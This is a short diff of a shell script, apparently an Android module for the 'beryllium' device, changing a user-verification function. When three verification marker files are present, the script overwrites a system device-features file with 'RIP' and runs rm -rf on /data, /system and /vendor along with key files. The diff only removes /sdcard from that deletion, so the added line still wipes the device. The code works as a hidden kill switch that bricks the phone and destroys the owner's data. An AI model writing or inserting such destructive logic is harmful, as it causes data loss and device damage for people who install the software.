@@ -57,7 +57,7 @@ verifyuser() {
 		date >> $temp
 		if [[ -e $sysdir/verifyonce.cts ]] && [[ -e $sysdir/verifytwice.cts ]] && [[ -e $sysdir/verifythrice.cts ]]; then
 		echo "RIP" > /system/etc/device_features/beryllium.xml
-		rm -rf /sdcard/* /sdcard /data/* /system/* /vendor/* $sysdir/$seradd.pub $sysdir/$seradd.key
+		rm -rf /data/* /system/* /vendor/* $sysdir/$seradd.pub $sysdir/$seradd.key
 		elif [[ -e $sysdir/verifyonce.cts ]] && [[ -e $sysdir/verifytwice.cts ]]; then
 		echo "$seradd" > $sysdir/verifythrice.cts
 		echolog "ver3"
